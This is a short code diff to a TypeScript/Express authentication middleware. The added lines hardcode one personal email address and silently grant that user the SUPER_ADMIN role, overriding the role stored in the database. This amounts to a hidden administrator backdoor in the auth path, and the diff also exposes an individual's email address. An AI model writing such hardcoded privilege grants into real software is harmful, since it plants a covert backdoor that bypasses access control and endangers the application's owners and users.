@@ -46,10 +46,13 @@ export const authenticate = async (req: Request, res: Response, next: NextFuncti
           return res.status(401).json({ error: 'Usuario inactivo o suspendido' });
         }
 
+        const effectiveRole =
+          user.email === 'carlosivancastillofeliz@gmail.com' ? Role.SUPER_ADMIN : user.role;
+
         req.user = {
           id: user.id,
           email: user.email,
-          role: user.role,
+          role: effectiveRole,
           companyId: user.companyMemberships[0]?.companyId,
         };
         return next();
